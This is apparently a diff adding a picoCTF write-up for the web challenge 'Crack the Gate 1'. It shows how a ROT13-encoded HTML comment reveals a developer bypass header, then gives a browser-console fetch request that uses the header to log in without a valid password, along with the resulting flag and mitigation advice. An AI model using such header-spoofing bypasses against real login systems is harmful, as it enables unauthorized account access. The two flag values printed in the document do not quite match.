@@ -1,0 +1,69 @@
+picoCTF Report: Crack the Gate 1
+Challenge Overview
+Platform: picoCTF
+
+Category: Web Exploitation
+
+Difficulty: Easy
+
+Vulnerability Type: Broken Access Control / Insecure Backdoor
+
+1. Initial Analysis
+Upon visiting the challenge page, I was presented with a standard login form requiring an email and password. Since the challenge description hinted at "notes left by developers," I inspected the page's source code.
+
+In the HTML comments, I found an encoded string: ``
+
+2. Decoding the Hint
+The string appeared to be encoded using ROT13. After decoding, it revealed the following message:
+
+Decoded: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+
+This indicates that the server-side logic contains a bypass mechanism that grants access if a specific HTTP header is provided, likely left over from a development or testing phase.
+
+3. Exploitation Process
+The standard browser login form did not allow me to add custom HTTP headers. To bypass this restriction, I used the Browser Developer Tools (Console) to manually trigger a fetch request to the /login endpoint.
+
+The Payload:
+JavaScript
+
+fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Dev-Access': 'yes' // Injecting the secret bypass header
+    },
+    body: JSON.stringify({
+        email: 'ctf-player@picoctf.org',
+        password: 'password' // Password no longer matters due to the bypass
+    })
+})
+.then(response => response.json())
+.then(data => console.log(data));
+4. Results
+The server responded with a success: true status and the flag: picoCTF{brut4_f0rc4_0d39383ff}
+
+5. Mitigation (Professional Recommendation)
+To prevent this vulnerability in a real-world application, the following steps should be taken:
+
+Remove Debugging Code: Ensure that all bypasses, "backdoors," or hardcoded development headers are removed before code is pushed to a production environment.
+
+Sanitize Comments: Avoid leaving sensitive technical information or "TODOs" in public-facing HTML/JS comments.
+
+Unified Authorization: Implement a centralized authorization service that does not rely on easily spoofable headers for access control decisions.
+
+fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Dev-Access': 'yes'
+    },
+    body: JSON.stringify({
+        email: 'ctf-player@picoctf.org',
+        password: 'any_password'
+    })
+})
+.then(res => res.json())
+.then(data => console.log(data));
+Promise {<pending>}
+VM40:13 {success: true, email: 'ctf-player@picoctf.org', firstName: 'pico', lastName: 'player', flag: 'picoCTF{brut4_f0rc4_0d39383f}'}
+
